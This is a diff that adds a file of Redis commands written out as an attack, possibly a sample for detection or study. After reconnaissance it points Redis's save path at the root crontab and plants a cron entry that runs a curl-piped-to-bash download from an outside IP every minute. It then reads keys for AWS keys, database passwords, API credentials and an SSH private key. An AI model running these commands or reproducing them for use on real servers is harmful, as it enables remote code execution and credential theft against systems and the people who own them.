@@ -1,0 +1,32 @@
+CONFIG GET dir
+CONFIG GET dbfilename
+INFO server
+KEYS *
+
+# Attacker reconnaissance complete, beginning exploitation
+
+CONFIG SET dir /var/spool/cron/crontabs
+CONFIG SET dbfilename root
+
+# Setting up malicious cron job payload
+
+SET payload "\n\n\n\n* * * * * root curl http://185.220.101.45:8080/exfil.sh | bash\n\n\n\n"
+
+# Writing malicious cron job to disk
+
+SAVE
+
+# Enumerating available data
+
+KEYS *
+
+# Exfiltrating sensitive data
+
+GET aws_access_keys
+GET prod_database_password
+GET api_credentials
+GET ssh_private_key
+
+# Final data extraction
+
+GET prod_database_password
